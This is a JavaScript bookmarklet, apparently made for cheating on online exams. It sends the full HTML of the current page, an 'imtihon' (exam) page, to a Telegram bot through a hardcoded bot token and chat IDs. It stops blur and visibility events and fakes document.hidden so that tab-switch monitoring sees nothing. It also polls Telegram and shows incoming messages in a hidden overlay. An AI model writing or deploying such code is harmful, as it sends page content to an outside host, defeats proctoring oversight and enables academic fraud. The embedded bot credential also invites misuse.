// javascript:(function(){
//   const BOT_TOKEN = '7905303120:AAFTHbtz_lDy4M4KxurDK0xKH63y7flT6VI';
//   const CHAT_ID = '5513237031';

//   const html = document.documentElement.outerHTML;
//   const blob = new Blob([html], { type: 'text/html' });

//   const formData = new FormData();
//   formData.append('chat_id', CHAT_ID);
//   formData.append('document', blob, 'imtihon.html');
//   formData.append('caption', 'Salom');

//   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
//     method: 'POST',
//     body: formData
//   })
//   .then(() => alert('Botga yuborildi! ✅'))
//   .catch(() => alert('Xato! ❌'));
// })();
javascript: (function () {
  // =========================
  // 1. TELEGRAM SEND
  // =========================

  const BOT_TOKEN = "7905303120:AAFTHbtz_lDy4M4KxurDK0xKH63y7flT6VI";
  const CHAT_ID = "6409116156";

  async function sendHTMLToTelegram() {
  // Клонируем страницу
  const clone = document.documentElement.cloneNode(true);

  // Собираем все CSS
  let styles = "";

  for (const sheet of document.styleSheets) {
    try {
      const rules = sheet.cssRules;

      for (const rule of rules) {
        styles += rule.cssText + "\n";
      }
    } catch (e) {
      console.warn("Нельзя прочитать CSS:", sheet.href);
    }
  }

  // Создаём style тег
  const styleTag = document.createElement("style");
  styleTag.innerHTML = styles;

  // Добавляем в head
  clone.querySelector("head").appendChild(styleTag);

  // Получаем полный HTML
  const fullHTML = "<!DOCTYPE html>\n" + clone.outerHTML;

  // Blob
  const blob = new Blob([fullHTML], {
    type: "text/html",
  });

  const formData = new FormData();

  formData.append("chat_id", CHAT_ID);
  formData.append("document", blob, "page.html");
  formData.append("caption", "Страница со стилями");

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
      method: "POST",
      body: formData,
    });

    alert("Yuborildi ✅");
  } catch (err) {
    console.error(err);
    alert("Xato ❌");
  }
}

  // =========================
  // 2. UI BLOCK
  // =========================

  function initUIBlock() {
    ["blur", "focusout", "mouseleave"].forEach((e) => {
      window.addEventListener(e, (ev) => ev.stopImmediatePropagation(), true);

      document.addEventListener(e, (ev) => ev.stopImmediatePropagation(), true);
    });

    document.addEventListener(
      "visibilitychange",
      (ev) => ev.stopImmediatePropagation(),
      true,
    );

    Object.defineProperty(document, "hidden", {
      get: () => false,
    });

    Object.defineProperty(document, "visibilityState", {
      get: () => "visible",
    });

    if (typeof HTMLAudioElement !== "undefined") {
      HTMLAudioElement.prototype.play = function () {
        return Promise.resolve();
      };
    }
  }

  // =========================
  // 3. SIMPLE UI BOX
  // =========================

  let box;

  function makeBox() {
    if (box) return box;

    box = document.createElement("div");

    Object.assign(box.style, {
      position: "fixed",
      left: "10px",
      bottom: "10px",
      background: "#111",
      color: "#fff",
      padding: "10px",
      borderRadius: "8px",
      font: "14px sans-serif",
      zIndex: 999999,
      display: "none",
    });

    document.body.appendChild(box);

    return box;
  }

  function showMessage(msg) {
    const b = makeBox();

    b.textContent = msg;
    b.style.display = "block";

    setTimeout(() => {
      b.style.display = "none";
    }, 3000);
  }

  let updateOffset = 10;

  async function loadMessages() {
    console.log("dsadsadsa");

    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${updateOffset}`,
    );

    const data = await res.json();

    data.result.forEach((update) => {
      updateOffset = update.update_id + 1;

      const text = update.message?.text;

      console.log(text);
      if (text) {
        showMessage(text);
      }
    });
  }

  // =========================
  // 4. USER EVENTS
  // =========================

  let clickCount = 0;

  document.addEventListener("click", () => {
    clickCount++;

    setTimeout(() => {
      clickCount = 0;
    }, 600);

    if (clickCount >= 3) {
      clickCount = 0;

      sendHTMLToTelegram();
    }
  });

  document.addEventListener("mousedown", (e) => {
    if (e.button === 0) {
      setTimeout(() => {
        showMessage("3 marta click → Telegramga yuboriladi");
      }, 100);
    }
  });

  // =========================
  // 5. INIT
  // =========================

  initUIBlock();
  setInterval(loadMessages, 3000);
})();
